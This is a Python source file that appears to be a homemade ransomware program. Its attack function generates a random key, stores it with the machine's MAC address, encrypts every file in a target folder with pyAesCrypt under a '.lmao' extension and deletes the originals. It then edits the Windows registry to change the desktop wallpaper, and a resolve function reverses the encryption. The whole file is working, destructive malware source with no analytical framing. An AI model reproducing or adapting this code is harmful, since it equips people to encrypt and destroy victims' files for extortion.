import os
import uuid
import random
import pyAesCrypt as crypt
import threading

#desktop change
import win32api, win32con, win32gui, random, time

bufferSize=64*1024

'''for (dirname,dirs,files) in os.walk("."):
	for filename in files:
		files.append(str(dirname)+"\\"+str(filename))
		filenames.append(str(filename))
'''	

def encrypt_and_remove(filename,password,bufferSize):
	crypt.encryptFile(filename,filename+str(".lmao"),password,bufferSize)
	os.remove(filename)

def decrypt_and_rest(file,temp,password,bufferSize):
	crypt.decryptFile(file,temp[0]+"."+temp[1],password,bufferSize)
	os.remove(file)

def attack(foldername):
	passfile=open("passfile.txt","w+")
	rand_key=random.getrandbits(256)
	password=str("%032x"%rand_key)
	mac=uuid.getnode()
	mac_and_pass=str(mac)+"\t"+password+"\n"
	passfile.write(mac_and_pass)
	passfile.close()
	os.chdir(foldername)
	filenames=os.listdir()
	for filename in filenames:
		#print("Encrypting "+filename)
		#threading.Thread(target=encrypt_and_remove,args=(filename,password,bufferSize)).start()
		crypt.encryptFile(filename,filename+str(".lmao"),password,bufferSize)
		os.remove(filename)
	

def resolve(foldername):
	passfile=open("passfile.txt","r")
	mac=str(uuid.getnode())
	lines=passfile.readlines()
	passfile.close()
	os.chdir(foldername)
	filename=os.listdir()
	for line in lines:
		temp=line.split("\t")
		if str(temp[0])==mac:
			password=str(temp[1][0:len(temp[1])-1])
			break
	for file in filename:
		temp=file.split('.')
		threading.Thread(target=decrypt_and_rest,args=(file,temp,password,bufferSize)).start()



'''os.chdir(".\\Files")
for filename in filenames:
	temp=filename.split('.')
	#print("Encrypting "+src_path+"\\"+filename)
	#crypt.encryptFile(filename,filename+str(".aes"),password,bufferSize)
	#os.remove(filename)
	crypt.decryptFile(filename,temp[0]+"."+temp[1],password,bufferSize)
	#index=index+1
'''

def SetWallPaper(path):
    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
                                "Control Panel\\\\Desktop",
                                0,win32con.KEY_SET_VALUE)
    win32api.RegSetValueEx(key, "WallpaperStyle", 0, win32con.REG_SZ, "0")
    win32api.RegSetValueEx(key, "TileWallpaper", 0, win32con.REG_SZ, "0")
    win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, path, 1+2)

path = r"C:\Users\Smit Gangurde\Desktop\l33t\NTAL\lmao.bmp"

if __name__=='__main__':
	attack("C:\\Users\\Smit Gangurde\\Desktop\\l33t\\NTAL\\Files")
	SetWallPaper(path)

